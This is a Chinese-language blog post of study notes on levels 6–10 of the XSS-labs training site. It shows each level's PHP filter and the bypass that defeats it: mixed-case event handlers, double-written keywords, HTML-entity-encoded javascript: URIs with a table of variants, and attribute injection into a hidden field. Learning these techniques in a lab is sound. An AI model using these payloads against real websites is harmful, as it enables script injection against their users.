---
title: "Xss-labs通关全解&&XSS笔记02"
publishDate: 2025-12-26 18:37:00
description: "分析以及笔记"
tags: ["XSS", "笔记", "Web"]
language: "中文"

---

> 初学者学习并且参考整理的笔记，仅供参考，非专业人员，难免有疏忽，借鉴他人，AI辅助之处，见谅。
> 
> 我选择直接使用源码呈现（正常情况下是无法看到完整源码的，只能看到页面源码）,一方面是省去试错payload所占用的篇幅，另一方面也是为了日后温习时能更加直观，不需要再挂其他的了，我觉得大部分过滤的方法都可以被试出来，多输入几次总归可以。\

## 第六关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level7.php?keyword=move up!"; 
}
</script>
<title>欢迎来到level6</title>
</head>
<body>
<h1 align=center>欢迎来到level6</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level6.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level6.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str6)."</h3>";
?>
</body>
</html>


```

1.可以看到这里的替换非常多且恐怖

```php
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
```

但是可以注意到他少了上一关的转化为小写字母，那么就很简单了 [绕过过滤](#绕过过滤)

2.我们可以如下构造

```php
" Onclick="alert(1) //对特定关键字随意变换大小写即可
```

其他的略

## 第七关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level8.php?keyword=nice try!"; 
}
</script>
<title>欢迎来到level7</title>
</head>
<body>
<h1 align=center>欢迎来到level7</h1>
<?php 
ini_set("display_errors", 0);
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level7.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level7.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str6)."</h3>";
?>
</body>
</html>

```

1.可以看到这里是把第六关的大小写漏洞填上了，同时基本上把属性（属性的关键字母）给过滤了（替换成空格）

```php
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
```

2.[绕过过滤](#绕过过滤) 这样我们就可以考虑 双写绕过

比如说 `script``href` `onclick` 等都可以考虑并且使用

```php
" oonnclick="alert(1)
```

> 注意⚠️ 这里的双写绕过不是 ononclick 这样写，这样写几遍都无效的，目的是被空替代，然后让首尾相接

## 第八关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level9.php?keyword=not bad!"; 
}
</script>
<title>欢迎来到level8</title>
</head>
<body>
<h1 align=center>欢迎来到level8</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level8.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
 echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
?>
<center><img src=level8.jpg></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
</body>
</html>

```

1.这一关的过滤基本上把之前的漏洞全填上了，大小写，关键词替换，甚至于`"`都被强制转义了

```php
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
```

2.这一关的注入点不在于这里了原来输入框，而在于下方

```php
echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
```

输入 `$str7` 被直接放进了 `<a>` 标签的 `href` 属性里。 **这意味着：** 我们不需要“逃逸”闭合标签，我们本来就在一个可以执行 JS 的地方（`href` 属性支持 `javascript:` 伪协议）

而`href`有一个属性，会先进行**HTML 解码**，还原之后，再执行。

3.那么就可以构造出

```html
javasc&#114;ipt:alert(1)
```

### HTML 实体编码

主要针对的就是php不会进行html解码，进而绕过过滤，而例如`href`会自动进行解码

| **方法 (Method)** | **构造代码 (Payload)**                                                                                                 | **备注**                                            |
| --------------- | ------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------- |
| **单字编码 (最推荐)**  | `javasc&#114;ipt:alert(1)`                                                                                         | 只改一个字母 `r`，最短最快。                                  |
| **首字编码**        | `java&#115;cript:alert(1)`                                                                                         | 只改一个字母 `s`。                                       |
| **插入 Tab 符**    | `javasc&#9;ript:alert(1)`                                                                                          | 利用 `&#9;` (Tab键) 打断单词。                            |
| **全部编码** <br>   | `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;`<br>`&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;` | **第一行是** `javascript:`<br>**第二行是** `alert(1)`<br> |

## 第九关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level10.php?keyword=well done!"; 
}
</script>
<title>欢迎来到level9</title>
</head>
<body>
<h1 align=center>欢迎来到level9</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level9.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
<center><img src=level9.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
</body>
</html>
```

1.可以看到，整体的思路和第八关是一样的，利用友情链接

2.但是这里多了判断，判断我们输入的链接是否合法，意味着上一关直接伪协议+编码是无效的

```php
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
```

分析一下可以知道，这里只是判断了传入的参数中 是否带有 `http://` 这一项，意味着我们可以在任何地方塞入

3.那么我们就可以在上一关基础上构造，利`//` 注释 使后续不生效

```php
javasc&#114;ipt:alert(1) // http://
```

换个思路想想，我们甚至可以不需要注释，直接塞到`alert()`之中,注意这里一定要使用`'`进行包裹

```php
javasc&#114;ipt:alert('http://')
```
## 第十关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level11.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level10</title>
</head>
<body>
<h1 align=center>欢迎来到level10</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level10.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.这一关只能靠传入参数的方式来构造payload，但问题出现了我们要给什么东西传参呢？

2.查看网页源码可以看到，有三个 `input`被隐藏了

```php
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
```

我们不妨对三个都传入参数，例如

```php
t_link=1&t_history=1&t_sort=1
```

由此可以发现注入点在`t_sort`

3.那么我们就可以和之前一样构造

```php
t_sort=" type="text" onclick="alert(1) 
```

| **障碍**              | **解决方法**                           |
| ------------------- | ---------------------------------- |
| **找不到注入点**          | 阅读源码（或盲猜），发现隐藏的 `t_sort` 参数。       |
| **过滤了 `< >`**       | 放弃标签逃逸，转向 **属性注入**（在标签内部添加属性）。     |
| **`type="hidden"`** | 注入 `type="text"` 覆盖原有属性，让元素显形以便交互。 |
